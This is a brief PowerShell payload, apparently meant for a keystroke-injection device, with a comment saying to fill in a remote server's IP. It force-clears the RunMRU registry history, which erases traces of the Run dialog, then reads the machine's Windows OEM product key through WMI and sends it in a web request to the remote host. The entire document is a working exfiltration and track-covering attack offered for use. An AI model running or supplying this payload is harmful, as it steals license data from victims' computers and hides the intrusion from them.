#Replace <REMOTE_IP_ADDRESS> with the actual IP address of the remote server hosting the script.


Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force; Invoke-WebRequest -Uri "http://<REMOTE_IP_ADDRESS>?duckey=$((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey)" -Method Get -UseBasicParsing | Out-Null
